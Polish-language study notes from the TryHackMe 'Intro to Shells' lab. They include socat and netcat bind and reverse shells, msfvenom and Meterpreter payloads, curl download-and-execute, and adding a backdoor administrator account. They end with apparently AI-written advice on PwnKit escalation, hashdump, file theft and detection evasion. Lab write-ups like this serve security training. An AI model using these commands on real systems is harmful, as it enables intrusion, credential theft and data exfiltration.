Tutaj nadal korzystam z piaskownicy Linuxa.

Skonfigurujmy ponownie powłokę bind! Wgrałem moją powłokę webową. W adresie URL użyłem teraz parametru polecenia:

```victim
<URL>webshell.php?cmd=socat TCP-L:5555 EXEC:"bash -li"
```

_Uwaga_ : działa **TYLKO** na komputerach z systemem Linux (zwróć uwagę na bash)

Na mojej maszynie atakującej kończę połączenie:

```attack
socat TCP:10.10.151.184:5555 -
```

co natychmiast nawiązało połączenie.

Teraz wykonajmy stabilizację dla socat.

**Stabilizacja Socat**  
Skonfigurowałem nasłuchiwacz przy użyciu powyższego polecenia victim.

Na moim ataku skonfigurowałem połączenie za pomocą

```attack
socat TCP:10.10.151.184:5555 FILE:`tty`,raw,echo=0
```

Wygląda jednak na to, że wygląda to tak samo, jak niestabilne połączenie netcat, więc nie jestem pewien, na czym polega różnica. Właściwie jest trochę gorzej, bo nie widzę, co jest wpisywane, żaden tekst nie jest odbijany na konsolę, chociaż uruchamianie poleceń takich jak `whoami`„działa”, nawet gdy nie widzę tekstu na konsoli.

**Stabilizacja Socat przy użyciu Netcat**  
Załóżmy, że mam zwykłe połączenie Netcat, konfigurację odwrotnej powłoki:

```target
nc <attack> <p> -e /bin/bash
```

ze słuchaczem:

```attack
nc -nvlp 4444
```

Nadal nie jest to interaktywne. Mogę jednak użyć tego połączenia, aby przejść na lepsze, stabilniejsze połączenie Socat.

W **nowym** terminalu:

```attack
socat tcp-l:5555 file:`tty`,raw,echo=0
```

która konfiguruje nowego nasłuchiwacza na innym porcie.

Wracając do mojej odwrotnej powłoki netcat, aby uruchomić ją na celu:

```target
socat tcp:<attacker-ip>:5555 exec:"bash -li",pty,stderr,sigint,setsid,sane
 
```

Jeśli sprawdzę mój nowy moduł nasłuchujący socat, zobaczę, że mam teraz interaktywną powłokę, z której mogę korzystać.

_UWAGA_ : wszystko to opiera się na założeniu, że na drugim komputerze był _już_ zainstalowany SoCat. Gdyby go nie było (co może się zdarzyć), musiałbym wgrać na niego plik binarny SoCat i go uruchomić.

1. Na komputerze atakującym pobierałem plik binarny i go hostowałem.
2. Korzystając z połączenia netcat na komputerze docelowym:

```target
curl http://<attacker-ip>:8000/socat -o /tmp/socat
chmod +x /tmp/socat
```

Aby pobrać plik binarny i nadać mu uprawnienia wykonywalne. Jeśli `curl`nie istnieje, mogę spróbować `wget`.

NASTĘPNIE mogę uruchomić specjalne polecenie socat, odwołując się do pliku binarnego:

```target
/tmp/socat TCP:<attacker-ip>:<port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

## Zabawa z systemem Windows 

Teraz przełączę się na maszynę wirtualną z systemem Windows, żeby zobaczyć, jak działa.

Pierwsze zadanie, które mi zlecono, polega na wypróbowaniu pliku `php-reverse-shell`PentestMonkey. Ten plik **NIE** działa w systemie Windows, co powoduje wyświetlenie następującego wyniku:

```attack
uname is not recognized as an internal or external command.
```

W tym momencie po prostu skonfigurowałem na moim komputerze program nasłuchujący  
`nc -nvlp 2222`

Następnie używam msfvenom do ładunków, które może wygenerować

```attack
msfvenom -l payloads | grep windows
```

Jest ich WIELE. Użyłem chatgpt, żeby znaleźć dość popularny: `windows/x64/shell_reverse_tcp`  
Wygeneruję go za pomocą

```attack
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attack_ip> LPORT=4444 -f exe -o windowsShell.exe
```

Wgrywam i działa.

Następnie loguję się przez RDP z mojego attackboxa:

```attack
`xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.25.98 /u:Administrator /p:'TryH4ckM3!'`
```

i ręcznie uruchamiam windowsShell.exe, który natychmiast tworzy odwrotną powłokę.

W mojej powłoce odwrotnej sprawdzam użytkownika i uprawnienia:

```attack
whoami
```

co daje

```attack
win-shells\administrator
```

co oznacza, że ​​mój użytkownik **win-shells** jest częścią grupy administratorów.

Następnie sprawdzam, czy reverse_shell znajduje się w cmd czy w Powershell.

```attack
$PSVersionTable
```

Nie jest, ponieważ nie jest rozpoznawany, więc przenoszę `powershell`terminal do PowerShella. Jeśli uruchomię go `$PSVersionTable`ponownie, zobaczę, że zwraca tabelę, co oznacza, że ​​teraz uruchamiam PowerShella.

Dodam własnego użytkownika:

```powershell
New-LocalUser -Name "kilpikona" -Password (ConvertTo-SecureString "password123" -AsPlainText -Force)
```

i dodaj do grupy **administratorów**

```powershell
Add-LocalGroupMember -Group "Administrators" -Member "kilpikona"
```

teraz mogę zalogować się na własne konto użytkownika.

### Zabawa z Meterpreterem i systemem Windows 

Po pierwsze, używam msfvenom do ładunków, które może wygenerować

```attack
msfvenom -l payloads | grep windows/x64/meterpreter*
```

`  
Wygeneruję ten, który wybiorę

```attack
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<attack_ip> LPORT=2222 -f exe -o /root/Desktop/meterpreter_stageless.exe
```

Ponieważ wygenerowałem ładunek bezetapowy, użyję funkcji upload serwera WWW, aby go przesłać.

Następnie zacznę `msfconsole`, żeby móc uruchomić multi/handler i przygotować się na przechwycenie powłoki.

Zaczynam `exploit/multi/handler`od ustawienia parametrów.

- Ustawiłem parametr ładunku: ustaw ładunek windows/x64/meterpreter_reverse_tcp
- Ustawiłem LHOST
- Ustawiam LPORT.  
    Następnie używam polecenia `exploit -j`, które uruchamia zadanie w tle.

Mogę sprawdzić aktywne zadania za pomocą `jobs`. W tym momencie zdałem sobie sprawę, że źle skonfigurowałem obsługę, więc wyłączyłem zadanie za pomocą

`jobs -K <job ID>`

a potem spróbowałem ponownie.

Na komputerze docelowym wrócę ponownie do webshella i użyję polecenia

```webshell
http://<target-ip>/uploads/windowsPHP.php?cmd=C:\xampp\htdocs\uploads\meterpreter_stageless.exe
```

co spowoduje zawieszenie się strony internetowej.

Wracając do mojego **multi-handlera** widzę, że nawiązano połączenie. Mogę to sprawdzić za pomocą , `sessions`aby się upewnić, że rzeczywiście istnieje nowe połączenie.

Użyję tego z`sessions -i <session_id>`

a teraz mam sesję Meterpretera.

Robię to samo, używając etapowego ładunku Meterpretera:`windows/x64/meterpreter/reverse_tcp`

Jeśli chodzi o użycie ładunku etapowego i bezetapowego, nie wydaje się, aby istniała nagła różnica, zwłaszcza że sandbox jest szeroko podatny na ataki. W praktyce jednak użycie ładunku etapowego będzie preferowane, jeśli potrzebuję niewielkiej przestrzeni dyskowej. Mogę użyć ładunku bezetapowego, jeśli przesyłam plik, tak jak robię to teraz, lub jeśli po prostu potrzebuję pliku binarnego, aby uprościć sprawę.

---

Uff! To było długie. Dzięki za poświęcenie czasu na przeczytanie i powodzenia w tworzeniu piekła! Haha... ha...

---

## Odniesienia 

> TryHackMe Lab, _„Wprowadzenie do powłok”_ : [https://tryhackme.com/room/introtoshells](https://tryhackme.com/room/introtoshells)

> PentestMonkey php-reverse-shell: [https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

### MOJE PODSUMOWANIE

Metoda revers shell ze stabilizacją 
1) Otwieram dwa terminale T1 i T2
2) W T1 wpisuje:   rlwrap nc -lvp 4444
3) W T2 wpisuje:    bash -i >& /dev/tcp/172.17.0.1/4444 0>&1
4) W T2– Teraz stabilizujemy to połączenie:  script /dev/null -c bash  Naciskam **Ctrl + Z** (sesja zostanie wstrzymana)
5) W T2 wpisuje :   stty raw -echo; fg   po `fg` naciśnij Enter jeszcze raz
Finalizacja:  W T2 wpisuje reset , (Jeśli zapyta o `terminal type`, wpisz `xterm` i Enter).

**Sprawdzanie czy procesy nie wiszą:** `ps aux | grep -E 'nc|python'`.
**Czyszczenie:** `killall nc python3`.

Meto zaawansowana reverse shell Metasploit
1) T1 Generowanie payloadu:    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f elf > met.elf
2) Udostępnianie pliku:    python3 -m http.server 8000
3) T2 ustawienie nasłuchu:   msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 172.17.0.1; set LPORT 4444; exploit"
4) T3 pobieranie i egzekucja:  curl http://172.17.0.1:8000/met.elf -o /tmp/met.elf && chmod +x /tmp/met.elf && /tmp/met.elf

**Co połączyć?** Gdy w **T2** zobaczysz `meterpreter >`, wpisz `sysinfo`, aby potwierdzić dostęp.

5) W T2 wpisz:   download /ścieżka/do/pliku/na/ofierze /home/kali/Pulpit/pobrany_plik

Aby pobrać plik z ofiary na Twoje Kali, musisz użyć komendy wewnątrz aktywnej sesji **Meterpreter** (w Twoim **T2**).

### Komenda Download (wewnątrz Meterpretera)

download /ścieżka/do/pliku/na/ofierze /home/kali/Pulpit/pobrany_plik

Praktyczne przykłady dla Twojego labu:

- **Pobranie pliku z `/tmp/` (najczęstszy scenariusz):**

    download /tmp/test_mat.txt /home/kali/Pulpit/
    
- **Pobranie pliku z flagą lub danymi (jeśli jesteś w kontenerze www):**
    
    download /var/www/html/config.php /home/kali/Pulpit/
 
- **Pobranie całego katalogu (użyj `-r` dla rekurencji):**

    download -r /var/www/html/ /home/kali/Pulpit/strona_www

Jasne, Mat. Skoro masz już stabilną sesję **Meterpreter**, te trzy moduły to absolutna klasyka "must-have" dla każdego pentestera. Pozwolą Ci one automatycznie znaleźć słabe punkty systemu, zamiast szukać ich ręcznie.

Oto Twoja lista na następną sesję:

---

### 1. Local Exploit Suggester (Święty Graal Eskalacji)

To narzędzie skanuje system ofiary i porównuje go z bazą znanych luk (exploitów). Powie Ci dokładnie, który exploit zadziała, żebyś z poziomu zwykłego użytkownika stał się **Rootem**.

- **Jak użyć:**
    
    1. Wrzuć sesję w tło: `background`
    2. Wpisz: `use post/multi/recon/local_exploit_suggester`
    3. Ustaw sesję: `set SESSION 1` 
    4. Odpal: `run`
        
jak przeskanuje szukamy zielonych ( CVE-2021-4034 **PwnKit** my testujemy) i wpisujemy w T2:

use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
set SESSION 1
set LHOST 172.17.0.1
set LPORT 5555
run    potem getuid

opcja jak powyższe nie zadziała robimy opcje 2 ,Zmieńmy "silnik" exploita na zwykły shell, który jest znacznie lżejszy i trudniejszy do wykrycia przez zabezpieczenia.

set PAYLOAD linux/x64/shell/reverse_tcp
run

### 2. ARP Scanner (Widzenie w ciemności)

Gdy jesteś w kontenerze, nie widzisz innych maszyn w sieci Dockerowej. Ten moduł przeskanuje sieć wewnętrzną i pokaże Ci adresy IP innych kontenerów (np. bazy danych), których nie widać z zewnątrz.

- **Jak użyć:**
    
    1. Wpisz w Meterpreterze: `run post/windows/gather/arp_scanner` (lub linuxowy odpowiednik w msf: `use post/linux/gather/checkvm`)
        
    2. Lub prościej bezpośrednio w sesji: `arp`

### 3. Hashdump (Kradzież Tożsamości)

Ten moduł wyciąga zakodowane hasła użytkowników (hashe). Jeśli uda Ci się go odpalić (zazwyczaj wymaga roota), dostaniesz listę, którą możesz potem "łamać" narzędziem John the Ripper.

- **Jak użyć:**
    
    1. Będąc w Meterpreterze, wpisz po prostu: `hashdump`
        
    2. Jeśli to kontener Linux, użyj: `run post/linux/gather/hashdump`

---

### 📋 Karta Komend: Zarządzanie Sesją

| **Komenda**         | **Co robi?**                                               |
| ------------------- | ---------------------------------------------------------- |
| **`background`**    | Chowa sesję Meterpreter do tła (żeby użyć modułów `post`). |
| **`sessions -l`**   | Pokazuje listę aktywnych sesji.                            |
| **`sessions -i 1`** | Wraca do sesji numer 1.                                    |

### Ważne wskazówki:

1. **Gdzie szukać pliku?** Po wpisaniu `download`, plik domyślnie wyląduje w folderze, z którego odpaliłeś `msfconsole` na swoim Kali (chyba że podasz pełną ścieżkę docelową, jak w przykładach powyżej).
    
2. **Uprawnienia:** Możesz pobrać tylko te pliki, do których użytkownik, na którym siedzi Meterpreter, ma prawo odczytu.
    
3. **Podgląd przed pobraniem:** Zanim coś pobierzesz, możesz podejrzeć zawartość pliku komendą `cat /ścieżka/plik`.
